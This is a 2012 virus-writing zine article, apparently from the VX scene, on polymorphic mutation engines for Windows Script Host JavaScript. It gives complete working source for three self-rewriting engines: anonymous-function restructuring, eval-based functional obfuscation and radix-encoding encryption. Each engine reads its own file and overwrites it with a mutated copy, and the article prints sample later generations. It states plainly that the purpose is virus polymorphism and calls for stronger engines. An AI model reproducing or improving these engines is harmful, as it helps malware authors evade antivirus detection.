@@ -1,0 +1,463 @@
+
+            ***********************************************
+             Exotic Morphing Techniques in JavaScript II  
+                                  by Second Part To Hell
+            ***********************************************
+
+
+
+  0) Introduction
+
+  1) Anonymous Functions
+
+  2) Functional programming paradigm
+
+  3) Radix games
+
+  4) Conclusion
+
+
+
+
+
+  0) Introduction
+
+     JavaScript is a beautiful language itself, and can be used for computer
+     viruses as we all know in a simple way. jackie twoflower wrote the first
+     JS polymorphism engine in 2001 (cant find the source - sorry); many years
+     ago I have written two texts about that topic [1][2]; there have been
+     several unconventional engines in recent years, for example roy g biv's
+     [3][4] or hh86's [5] creations.
+
+     In this text I present three different methods. The first methode changes
+     the structure by introding anonymous functions for small logical parts
+     of the code. The second and third part are novel polymorphic encryption
+     engines.
+
+     It seems to be possible to create a real self-recreating ("metamorphic")
+     engine in JavaScript - I predict this to come true one fine day :-)
+
+
+
+
+
+  1) Anonymous Functions
+
+     In 2011, hh86 has shown us a beautiful way to use functions in an
+     anonymous way [6]. One can implicitly define variables or arrays as a
+     function.
+
+     This mutation engine parses itself, and defines part of the code as
+     new anonymous functions or function-arrays:
+
+- - -
+for(i=0;i<10;i++)
+{
+    WScript.Echo('Hello');
+    if(i>5) { WScript.Echo('VX'); WScript.Echo('s!'); }
+    WScript.Echo(':-)');
+}
+- - -
+     This can be transformed into:
+- - -
+a=new Array(function(){WScript.Echo('VX');},function(){WScript.Echo('Hello');})
+b=function(){WScript.Echo('s!');}
+for(i=0;i<10;i++)
+{
+    a[1]();
+    if(i>5) { a[0](); b(); }
+    WScript.Echo(':-)');
+}
+- - -
+
+     or
+
+- - -
+a=new Array()(function(){    WScript.Echo('Hello');
+    if(i>5) { WScript.Echo('VX'); WScript.Echo('s!'); }},function(){WScript.Echo(':-)');})
+for(i=0;i<10;i++)
+{
+    a[1]();
+    a[0]();
+}
+- - -
+
+     and so on...
+     Now the code
+
+- - -
+s=function(n){return(String.fromCharCode(n));}
+
+fillit=function(n)
+{
+    RV='';
+    l10=5-Math.log(n)/2.3025;
+    for(x=0;x<l10;x++){RV+='0';}
+    RV+=n;
+    return(RV);
+}
+
+randomString=function()
+{
+    rndString='';
+    n=Math.floor(Math.random()*10)+4;
+    for(i=0;i<n;i++)
+    {
+        rndString+=s(Math.floor(Math.random()*26)+97);
+    }
+    return(rndString);
+}
+
+replaceTmpInst=function(TmpCode)
+{
+    while(TmpCode.search(s(95)+s(64))!=-1)
+    {
+        posA=TmpCode.search(s(95)+s(64));
+        posO=TmpCode.search(s(64)+s(95));
+        number=TmpCode.substring(posA+2,posO);
+        TmpCode=TmpCode.substring(0,posA)+NewCode[number]+TmpCode.substring(posO+2);
+    }
+    return(TmpCode);
+}
+
+
+_fso=WScript.CreateObject('Scripting.FileSystemObject');
+_code=_fso.OpenTextFile(WScript.ScriptFullName).ReadAll();
+WScript.Echo(_code);
+
+ParseInfo=new Array();
+InstStart=new Array();
+InstStart[0]=0;
+InstPointer=0;
+
+while(InstPointer<InstStart.length)
+{
+    i=InstStart[InstPointer];
+    ParseInfo[InstPointer]=new Array();
+    ElementPointer=0;
+    _numBrak1=1;
+    ElementStart=i;
+    while(_numBrak1&&i<_code.length)
+    {
+        if(_code.substr(i,11)=='=new '+'Array'+s(40))
+        {
+            i+=11;
+            _numBrak3=1;
+            while(_numBrak3)
+            {
+                if(_code.substr(i,1)==s(40)) { _numBrak3++; }
+                if(_code.substr(i++,1)==s(41)) { _numBrak3--; }
+            }
+            i++;
+            ParseInfo[InstPointer][ElementPointer++]=_code.substr(ElementStart,i-ElementStart);            
+            ElementStart=i;
+        }
+
+        if(_code.substr(i,10)=='=func'+'tion'+s(40))
+        {
+            i+=10;
+            _numBrak3=1;
+            while(_numBrak3)
+            {
+                if(_code.substr(i,1)==s(40)) { _numBrak3++; }
+                if(_code.substr(i++,1)==s(41)) { _numBrak3--; }
+            }
+            while(_code.substr(i++,1)!=s(123))
+            {
+            }
+            _numBrak3=1;
+            while(_numBrak3)
+            {
+                if(_code.substr(i,1)==s(123)) { _numBrak3++; }
+                if(_code.substr(i++,1)==s(125)) { _numBrak3--; }
+            }
+            i++;
+            ParseInfo[InstPointer][ElementPointer++]=_code.substr(ElementStart,i-ElementStart);
+            ElementStart=i;
+        }
+
+        if(_code.substr(i,4)==s(102)+s(111)+s(114)+s(40))
+        {
+            i+=4;
+            _numBrak2=1;
+            while(_numBrak2)
+            {
+                if(_code.substr(i,1)==s(40)) { _numBrak2++; }
+                if(_code.substr(i++,1)==s(41)) { _numBrak2--; }
+            }
+        }
+
+        if(_code.substr(i,1)==s(123))
+        {
+            _numBrak1++;
+            InstStart.push(++i);
+            ParseInfo[InstPointer][ElementPointer++]=_code.substr(ElementStart,i-ElementStart)+s(95)+s(64)+(InstStart.length-1)+s(64)+s(95)+s(125);
+            while(_numBrak1>1)
+            {
+                if(_code.substr(i,1)==s(123)) { _numBrak1++; }
+                if(_code.substr(i++,1)==s(125)) { _numBrak1--; }
+            }
+            ElementStart=i;
+        }
+
+        if(_code.substr(i,1)==s(125))
+        {
+            _numBrak1--;
+        }
+
+        if(_code.substr(i,1)==s(59))
+        {
+            ParseInfo[InstPointer][ElementPointer++]=_code.substr(ElementStart,i-ElementStart+1);
+            ElementStart=i+1;
+        }
+        i++;
+    }
+    InstPointer++;
+}
+
+
+for(i=0; i<ParseInfo.length;i++)
+{
+    for(j=0;j<ParseInfo[i].length;j++)
+    {
+    }
+}
+
+
+ReplacedEntries=new Array();
+NewCode=new Array();
+for(i=0;i<ParseInfo.length;i++)
+{
+    NewCode[i]='';
+    for(j=0;j<ParseInfo[i].length;j++)
+    {
+        AlreadyDid=0;
+        if(Math.floor(Math.random()*3))
+        {
+            NewCode[i]+=ParseInfo[i][j];AlreadyDid=1;
+        }
+        if(!AlreadyDid)
+        {
+            tmpR=Math.floor(Math.random()*(ParseInfo[i].length-j-1));
+            ReplacedEntries.push(ParseInfo[i].slice(j,j+tmpR+1).join(''));
+            NewCode[i]+='tmp'+'Var'+fillit(ReplacedEntries.length)+s(40)+s(41)+s(59);
+            j+=tmpR;
+        }
+    }
+}
+
+
+NewCode[0]=replaceTmpInst(NewCode[0]);
+
+AnoFuncts=new Array();
+AnoNameArr=randomString();
+AnoArr=AnoNameArr+'=new'+' Array'+s(40);
+ArrCount=0;
+for(l=0;l<ReplacedEntries.length;l++)
+{
+    ReplacedEntries[l]=replaceTmpInst(ReplacedEntries[l]);
+    AlreadyDid=0;
+    if(Math.floor(Math.random()*3))
+    {
+        functionString=AnoNameArr+'['+ArrCount++ +']';
+        AnoArr+='function'+s(40)+s(41)+s(123)+ReplacedEntries[l]+s(125)+',';
+        AlreadyDid=1;
+    }
+    if(!AlreadyDid)
+    {
+        functionString=randomString();
+        AnoFuncts.push(functionString+'=function'+s(40)+s(41)+s(123)+ReplacedEntries[l]+s(125)+s(59)+s(13)+s(10));
+    }
+
+    NewCode[0]=NewCode[0].replace('tmp'+'Var'+fillit(l+1),functionString);
+    AnoArr=AnoArr.replace('tmp'+'Var'+fillit(l+1),functionString);
+    for(m=0;m<AnoFuncts.length;m++)
+    {
+        AnoFuncts[m]=AnoFuncts[m].replace('tmp'+'Var'+fillit(l+1),functionString);
+    }
+    for(m=0;m<ReplacedEntries.length;m++)
+    {
+        ReplacedEntries[m]=ReplacedEntries[m].replace('tmp'+'Var'+fillit(l+1),functionString);
+    }
+
+}
+
+
+if(AnoArr.substr(AnoArr.length-1)==',')
+{
+    NewCode[0]=AnoArr.substr(0,AnoArr.length-1)+s(41)+s(59)+s(13)+s(10)+NewCode[0];
+}
+
+
+for(i=0;i<AnoFuncts.length;i++)
+{
+    NewCode[0]=AnoFuncts[i]+NewCode[0];
+}
+
+
+WScript.Echo(NewCode[0]);
+file=_fso.CreateTextFile(WScript.ScriptFullName);file.Write(NewCode[0]);file.close();
+- - -
+
+    and one of its later generations, where the code is size-optimized
+
+- - -
+djojldonrowxm=function(){vrlbq[0]();};eveymzmvouj=function(){mdtgpmpuvazl=new Array(function(){xyvvo[0]();xqtpr=new Array(function(){xubil=function(){fcS=ANA+'['+ArC++ +']';};aiaymdozllav=function(){hzybixo[0]();};wwnruqtbbj=new Array(function(){yziuvmtpwwbh=function(){fi=function(n){RV='';l10=5-Math.log(n)/2.3025;for(x=0;x<l10;x++){RV+='0';}RV+=n;return(RV);};zxurrtohj();AoF=new Array();ANA=rSt();AoA=ANA+'=new'+' Array'+s(40);};hzybixo=new Array(function(){ NCo[0]=NCo[0].replace('tmp'+'Var'+fi(l+1),fcS);AoA=AoA.replace('tmp'+'Var'+fi(l+1),fcS);for(m=0;m<AoF.length;m++){hzybixo[3]();}},function(){ for(m=0;m<REn.length;m++){hzybixo[4]();}},function(){fcS=rSt();},function(){AoF[m]=AoF[m].replace('tmp'+'Var'+fi(l+1),fcS);},function(){REn[m]=REn[m].replace('tmp'+'Var'+fi(l+1),fcS);});fjjcwcnsm=function(){nB1--;};},function(){jnwznbgkvjhij=function(){ADi=1;};vyikfedxnq=function(){i=ISt[IPo];PIn[IPo]=new Array();EPo=0;nB1=1;ESt=i;while(nB1&&i<cc.length){if(cc.substr(i,11)=='=new '+'Array'+s(40)){roiern[9]();roiern[10]();PIn[IPo][EPo++]=cc.substr(ESt,i-ESt);ESt=i;}if(cc.substr(i,10)=='=func'+'tion'+s(40)){i+=10;nB3=1;while(nB3){if(cc.substr(i,1)==s(40)){nB3++;}if(cc.substr(i++,1)==s(41)){nB3--;}}while(cc.substr(i++,1)!=s(123)){}nB3=1;while(nB3){roiern[19]();qhgmagv();}roiern[11]();PIn[IPo][EPo++]=cc.substr(ESt,i-ESt);ESt=i;}if(cc.substr(i,4)==s(102)+s(111)+s(114)+s(40)){roiern[12]();nB2=1;roiern[13]();}if(cc.substr(i,1)==s(123)){nB1++;lzpdhhozmhmo();roiern[14]();}if(cc.substr(i,1)==s(125)){roiern[15]();}if(cc.substr(i,1)==s(59)){PIn[IPo][EPo++]=cc.substr(ESt,i-ESt+1);ESt=i+1;}roiern[6]();}};zxurrtohj=function(){rSt=function(){rTp='';n=Math.floor(Math.random()*10)+4;for(i=0;i<n;i++){rTp+=s(Math.floor(Math.random()*26)+97);}return(rTp);};rTI=function(TCo){while(TCo.search(s(95)+s(64))!=-1){pA=TCo.search(s(95)+s(64));pO=TCo.search(s(64)+s(95));TCo=TCo.substring(0,pA)+NCo[TCo.substring(pA+2,pO)]+TCo.substring(pO+2);}return(TCo);};fso=WScript.CreateObject('Scripting.FileSystemObject');cc=fso.OpenTextFile(WScript.ScriptFullName).ReadAll();PIn=new Array();ISt=new Array();ISt[0]=0;IPo=0;while(IPo<ISt.length){vyikfedxnq();IPo++;} REn=new Array();NCo=new Array();for(i=0;i<PIn.length;i++){roiern[2]();roiern[3]();} NCo[0]=rTI(NCo[0]);};roiern=new Array(function(){ if(AoA.substr(AoA.length-1)==','){roiern[4]();} for(i=0;i<AoF.length;i++){roiern[5]();} file=fso.CreateTextFile(WScript.ScriptFullName);},function(){file.close();},function(){NCo[i]='';},function(){for(j=0;j<PIn[i].length;j++){ADi=0;if(Math.floor(Math.random()*3)){NCo[i]+=PIn[i][j];ADi=1;}if(!ADi){roiern[16]();j+=tpR;}}},function(){NCo[0]=AoA.substr(0,AoA.length-1)+s(41)+s(59)+NCo[0];},function(){NCo[0]=AoF[i]+NCo[0];},function(){i++;},function(){AoA+='function'+s(40)+s(41)+s(123)+REn[l]+s(125)+',';},function(){AoF.push(fcS+'=function'+s(40)+s(41)+s(123)+REn[l]+s(125)+s(59));},function(){i+=11;nB3=1;while(nB3){roiern[17]();roiern[18]();}},function(){i++;},function(){i++;},function(){i+=4;},function(){while(nB2){if(cc.substr(i,1)==s(40)){nB2++;}roiern[20]();}},function(){ESt=i;},function(){nB1--;},function(){tpR=Math.floor(Math.random()*(PIn[i].length-j-1));REn.push(PIn[i].slice(j,j+tpR+1).join(''));NCo[i]+='tmp'+'Var'+fi(REn.length)+s(40)+s(41)+s(59);},function(){if(cc.substr(i,1)==s(40)){roiern[21]();}},function(){if(cc.substr(i++,1)==s(41)){nB3--;}},function(){if(cc.substr(i,1)==s(123)){nB3++;}},function(){if(cc.substr(i++,1)==s(41)){nB2--;}},function(){nB3++;});s=function(n){return(String.fromCharCode(n));};yziuvmtpwwbh();ArC=0;for(l=0;l<REn.length;l++){wwnruqtbbj[2]();if(Math.floor(Math.random()*3)){xubil();wwnruqtbbj[3]();wwnruqtbbj[4]();}if(!ADi){hzybixo[2]();roiern[8]();}aiaymdozllav();hzybixo[1]();}xtoefknthtltz();},function(){REn[l]=rTI(REn[l]);ADi=0;},function(){roiern[7]();},function(){jnwznbgkvjhij();});xtoefknthtltz=function(){roiern[0]();};wwnruqtbbj[0]();ocyflkcwqv=function(){nB3--;};qhgmagv=function(){if(cc.substr(i++,1)==s(125)){ocyflkcwqv();}};lzpdhhozmhmo=function(){ISt.push(++i);PIn[IPo][EPo++]=cc.substr(ESt,i-ESt)+s(95)+s(64)+(ISt.length-1)+s(64)+s(95)+s(125);while(nB1>1){if(cc.substr(i,1)==s(123)){ nB1++;}if(cc.substr(i++,1)==s(125)){fjjcwcnsm();}}};wwnruqtbbj[1]();});});xyvvo=new Array(function(){vrlbq=new Array(function(){roiern[1]();});acqv=new Array(function(){xqtpr[0]();file.Write(NCo[0]);});});mdtgpmpuvazl[0]();acqv[0]();};eveymzmvouj();djojldonrowxm();
+- - -
+
+
+
+
+
+
+
+  2) Functional programming paradigm
+
+     Functional coding style, where the program consists of functions only.
+     It it used for several computational-learning projects, and it has some
+     advantage for calculation recursive defined functions such as the
+     factorial. (See my text about infection of F# files as an example [7])
+
+     This paradigm can be used for a mutation engine too. In my example, the
+     code is executed via 'eval', and the code is created by several
+     function calls. For example:
+
+
+- - -
+WScript.Echo("Hello VXers!");
+- - -
+
+     can be written as
+
+- - -
+function ojcdq(){return('W')}
+function tzcpzbnwhtg(){return('Sc'+'rip'+'t')}
+function wcvuwwmtz(){return('("')}
+function wtjuexpfx(){return(wcvuwwmtz()+'He')}
+function ulungrnk(){return(''+'ho'+wtjuexpfx())}
+function lprsoom(){return('Xe')}
+function wyzqqqw(){return(lprsoom()+'r')}
+function nkwfmavxxuxl(){return(wyzqqqw()+'s!')}
+function xvqdwuu(){return('')}
+eval(ojcdq()+tzcpzbnwhtg()+'.Ec'+ulungrnk()+'llo'+' V'+nkwfmavxxuxl()+'")'+';'+xvqdwuu());
+- - -
+
+     After 2-3 few generations, the code is absolutly unreadable. See the engine:
+
+- - -
+function randomName(){rv="";tmp=Math.random()*10+3;for(j=0;j<tmp;j++){rv+=String.fromCharCode(Math.floor(Math.random()*26+97));}return(rv)}
+function sortNumber(a,b){return(a-b)}
+
+function func(str)
+{
+    a=new Array(0,str.length);
+    for(i=0;i<Math.floor(str.length/15);i++)
+    {
+        a.push(Math.floor(Math.random()*(str.length+1)));
+    }
+    a=a.sort(sortNumber);
+
+    newcode="";
+    for(i=0;i<(a.length-1);i++)
+    {
+        if(Math.random()>0.7)
+        {
+            newfnames.push(randomName());
+            newfuncts.push(str.substring(a[i],a[i+1]));
+            newcode+=newfnames[newfnames.length-1]+"()+";
+        }
+        else
+        {
+            newcode+=String.fromCharCode(89)+str.substring(a[i],a[i+1])+String.fromCharCode(89)+"+";
+        }
+    }
+    return(newcode.substr(0,newcode.length-1));
+}
+
+fso=WScript.CreateObject("Scripting.FileSystemObject");
+code=fso.opentextfile(WScript.scriptfullname).readall();
+newfuncts=new Array();
+newfnames=new Array();
+
+allcode="eval("+func(code)+");";
+while(newfuncts.length)
+{
+    allcode="function "+newfnames.pop()+"(){return("+func(newfuncts.pop())+")}"+allcode;
+}
+while(allcode.lastIndexOf(String.fromCharCode(39))!=-1)
+{
+    allcode=allcode.replace(String.fromCharCode(39),String.fromCharCode(89)+"+String.fromCharCode(39)+"+String.fromCharCode(89))
+}
+while(allcode.lastIndexOf(String.fromCharCode(89))!=-1)
+{
+    allcode=allcode.replace(String.fromCharCode(89),String.fromCharCode(39))
+}
+WScript.Echo(allcode);
+file=fso.CreateTextFile(WScript.scriptfullname);file.Write(allcode);file.close();
+- - -
+
+    You have to remove line-breaks to get it working.
+
+
+
+
+
+  3) Radix games
+
+     This idea is encryption based on different base-systems, such as binary,
+     decimal, hexadecimal. JavaScript provides a function that transforms
+     numbers to different base-systems (parseInt(m,r)).
+
+     The idea comes from hh86, i just put together the code :) The engine
+     is very simple, yet the outcome is pretty beautiful:
+
+- - -
+function d(m,r){return(String.fromCharCode(parseInt(m,r)));}
+
+c=String.fromCharCode(34);
+v="ns='s=new Array(';no='o=new Array("+c+"';for (i=0;i<v.length;i++){n=Math.round(Math.random()*100)*65536+v.charCodeAt(i);r=Math.round(Math.random()*33)+2;m=(n).toString(r);if(i){ns+=',';no+='"+c+","+c+"';}ns+=r;no+=m;}";
+v+="nv='function d(m,r){return(String.fromCharCode(parseInt(m,r)));}'+ns+');'+no+'"+c+");v="+c+c+";for(i=0;i<o.length;i++){v+=d(o[i],s[i])};eval(v);';WScript.Echo(nv);var fso=WScript.CreateObject("+c+"Scripting.FileSystemObject"+c+");file=fso.CreateTextFile("+c+"ng.js"+c+");file.Write(nv);file.close()";
+s=new Array()
+o=new Array()
+for(i=0;i<v.length;i++)
+{
+  s.push(10);
+  o.push(""+v.charCodeAt(i));
+}
+
+ns='s=new Array(';no='o=new Array("';for (i=0;i<v.length;i++){n=Math.round(Math.random()*100)*65536+v.charCodeAt(i);r=Math.round(Math.random()*33)+2;m=(n).toString(r);if(i){ns+=',';no+='","';}ns+=r;no+=m;}
+nv='function d(m,r){return(String.fromCharCode(parseInt(m,r)));}'+ns+');'+no+'");v="";for(i=0;i<o.length;i++){v+=d(o[i],s[i])};eval(v);';
+WScript.Echo(nv);var fso=WScript.CreateObject("Scripting.FileSystemObject");file=fso.CreateTextFile("ng.js");file.Write(nv);file.close()
+- - -
+
+    One mutated file might look like this
+
+- - -
+function d(m,r){return(String.fromCharCode(parseInt(m,r)));}s=new Array(20,25,12,27,24,14,26,21,19,35,26,20,5,16,13,11,19,23,17,33,4,16,12,28,13,24,20,33,29,9,4,17,14,22,14,15,14,27,21,15,30,13,28,27,9,26,21,23,35,19,9,26,20,2,14,8,21,8,24,30,31,12,11,21,21,24,18,3,12,25,28,12,14,32,6,6,7,23,8,24,24,34,27,8,11,17,3,25,19,3,25,3,23,17,33,15,22,21,28,16,23,25,15,31,24,29,23,17,26,8,31,8,14,27,24,17,29,23,26,27,13,5,9,20,24,34,23,20,15,34,11,12,20,12,29,33,7,19,15,7,20,8,24,11,31,10,6,32,6,4,10,5,11,7,26,8,26,23,9,5,8,27,13,24,35,12,19,26,27,3,16,17,21,25,21,19,22,27,28,13,16,10,12,4,21,11,26,26,13,3,17,27,12,19,27,6,21,9,35,9,23,11,21,29,9,7,23,11,19,30,19,7,28,34,18,28,5,6,13,10,29,28,32,7,4,23,16,4,8,16,12,15,4,14,7,34,29,27,13,3,32,22,5,30,8,20,32,24,11,5,5,14,30,32,22,6,13,23,3,4,31,17,6,18,10,33,31,18,22,23,26,21,3,30,7,7,35,3,4,16,24,27,26,20,13,4,33,3,20,17,35,5,24,13,9,14,33,11,18,29,16,10,34,15,3,17,29,12,34,24,23,19,34,3,34,15,11,29,14,2,11,28,7,27,9,27,20,24,14,25,23,25,19,21,11,30,26,24,20,16,34,4,7,17,25,18,15,29,14,31,10,9,7,10,20,26,27,19,27,9,3,32,25,15,12,18,19,18,10,14,33,25,25,17,33,32,31,24,3,20,33,20,18,9,22,27,10,31,25,24,8,10,11,5,15,4,8,33,10,16,34,12,17,28,20,3,26,9,3,14,12,7,23,28,22,7,23,26,4,22,20,31,20,24,14,15,27,32,11,12,10,15,10,16,10,33,12,8,22,17,28,28,26,19,12,25,8,5,22,19,16,5,23,22,22,15,4,4,27,18,11,22,16,14,6,9,32,15,3,31,23,31,24,3,27,4,22,21);o=new Array("7fd4e","en7cj","382bb9","1jgh2","e5cj","182713","37joa","15k2hg","fb418","4ctvm","5j3p3","14jeaa","2201444311","120061","a31249","3289a97","2behb2","c424l","d629","4sfv1","3200000331","110027","210303b","508p1","778965","5chml","109c5j","3jho1","3sfq9","7133237","1100001302","2g3c88","9c2853","g4lcc","19c546","1ad58e","90356b","4ln4o","13cccj","36bb54","ql0s","347a26","14ni1","6hnl","10221406","3j0n","1ae47d","67a14","23d1b","eb1f1","2746728","7fg8d","1c73ce","1000010000000001100111","2cd35a","6600150","921b8","22600151","akhkb","2to95","qcc3","a33223","2778518","ii63c","i42kh","779mh","1g6156","21122102211221","1579092","4hb4m","5f6pj","1120445","455bb0","3e034","41141304","240531245","2533422","g3f91","15400150","6lm76","921na","3vdf7","5lda7","2400144","3697473","29g06c","111022122112","6deck","1idbbi","22111202001201","1045e","102120222112011","1045jc","2154c2","1nhkp","6331b5","3k3h3","14jij2","2cij2","19002b","diic5","1491n","b9bd3","2uca2","5m5c1","7ha2i","k358d","49ba76","84e2o","12600145","1uigs","13400164","7b27a0","6hpb","i8l9h","3fc0d","8n83o","3h46l","443el","aq92i","47881c","1442213403","12638370","1b2c2a","ii91n","2m1g1","ffke0","1djij8","15aa7b","19c21","3120096","ba2898","15g23c","147143a","44qnl","42vdf","26024510","b1431","750881","45265225","122794","1600051","d5f4a","185951a","21omg","6225961","322112351","5k01i","22014203","2000001231","4390973","2033204334","656991","32645001","bjji6","31000164","d1887","1k25h","7353055","2124201343","14200151","3peoa","692769","2i8n0","3kbyq","1046661","1cci3d","50d7f","8ab6b","20021210212201","500069","221a82","1b77d0","1l3f6","da1bk","23e0i2","10252d","77c1k","1glq4","40a144","30003b","5963886","5007a7","13200000223","88j6k","2812721","7bn78","9flco","5a9523","1121021201211","169344","1cppk","1a7983a","15c3ei","8h1pk","305440141","kifje","10441234","w3jq","5484523","f52g7","3697428","18dff5","84dgq","1427852","54360040","ja1ie","2042166","70ece","2crs","204373","53302643","3kdnf","4kp56","23h3cd","44c67","1123243024","220140332","b61c99","4063272","6rfhc","508oc","5u03i","5366535","22200001323","931i5","70065","32100001310","13200165","2a0072","1a7983a","57cb7e","22300001103","665c0c","21412132","2kcq5","1jan9","9a1be","992873","10012120111112","3403i","adjdd","1101000110","lpd1","21000150","6b1dd","1a03i","5m5aj","3572789","2142400111","200132113","70d372","2f7e8","3o031","50hbc","242155015","40a191","h7dh3","22010202110012","3200001310","1nuss","4c0gd","322112352","305bhc","3342377","3lbu8","59um5","1a1c75","ig88d","ke023","d5147","8g011","22212201211221","7rq5l","62002261","26416413","31yxo","11001212201000","113200000223","22006e","7glcf","4ln2j","9flcj","83ghe","585757","103300000323","3lbwj","2012221020221","1djig2","1da415","juim","3102312213","i8lcf","130b25","8561848","681a53","13fll","1983201","8d5hd","1b90g","3003c","3145839","2m1dw","49d91c","101222100002211","12a89g","5qsbl","1579130","2717u","2b","6i4kl","1idbc0","3oolh","21112002212100","1rno7","a55a6","27331a9","ing4","77ab40","10000000000101000","2733260","3qd0b","6454053","1cpof","13287816","7o2hn","iggh7","a6cf1","229d13","f2c66","l1i0f","9i6km","6a45e","14jj16","3244880","699r6","bncgg","g004m","19i089","21003b","1cndx","31000000323","53302611","38adb6","491ba","3d7hc","1d7367","76hb3","875c44","2coll","2359365","11430451","103235415","5963887","1baffc","6mpfk","d8kb","224764","64d04","1537752","201222112011","2c03i","b60cj","184850","190a183","2d5de7","1g3fic","183hc3","4390995","630135","3p0bb","g2gcb","654mj","586d4","5fj7","3m023","5ec5k","2df6l","21101210001011","1g0i44","phk7","cdj4f","2cc98e","8232308","g4lf7","5ld9n","2031732","4l5th","44lc9","872jb","26200143","1638514","31200a3","323020433","6715cb","113000001221","12200156","2htcb","4456494","440046","1mnl3","b3aa64","1gca68","4m9kj","d233d","100010101122110","34100","6034143","11012012200212","bd2859","1aab742","106101643","53bg0","6b3hn","1408ji","53302504","70dfc","b12ph","31000001212","1eke5","202gbg","21oo4","31","5chmm","665c0b","3be665","83k9m","20023","1168518","1333919","5898337","4dbce8","852069","5d0054","5046373","5hc3j","143b584","14600106","j6f3b","3age10","85ojh","5o5go","c8hc6","22di12","1bb739b","c1okd","15600152","1310231004","12ddfc","244b95","21003b","3020420124","5jf88","2b8j2","4d","1c2bd7","33100001113","112300001302","8ab6e","1bh772","1734880","13g57a","25006e","b80d70","42404533","8561870","5c036","11c6ed","2201020220201","21oo4","mljm8","6bum0","2df74","21101210001200","54mo4","2200001211","dfck8","584h3");v="";for(i=0;i<o.length;i++){v+=d(o[i],s[i])};eval(v);
+- - -
+
+
+
+
+
+  4) Conclusion
+
+     JavaScript allows many kind of mutation engines. Obviously much stronger
+     engines would be possible. We should work on this some day! :-)
+
+
+
+                                                          Second Part To Hell
+                                                                 January 2012
+
+
+
+
+[1] SPTH, "Polymorphism in JavaScript", in rRlf#4, August 2003 (http://vxheavens.com/lib/vsp02.html).
+[2] SPTH, "Exotic Morphing Techniques In JavaScript", in rRlf#4, October 2003 (http://vxheavens.com/lib/vsp03.html).
+[3] roy g biv, "Self-crypting script files", in 29a#7, Februar 2003.
+[4] roy g biv, "Polymorphism using the Microsoft Script Encoder", rRlf#7, March 2006 (http://vx.netlux.org/lib/vrg06.html).
+[5] hh86, "I Err.Raise, you fall", in Valhalla#1, August 2011 (http://vxheavens.com/lib/vhh06.html).
+[6] hh86, "Function Me", in Valhalla#1, August 2011 (http://vxheavens.com/lib/vhh04.html).
+[7] SPTH, "A brief viral Introduction into F#", in rRlf#7, July 2006 (http://vxheavens.com/lib/vsp30.html).
+
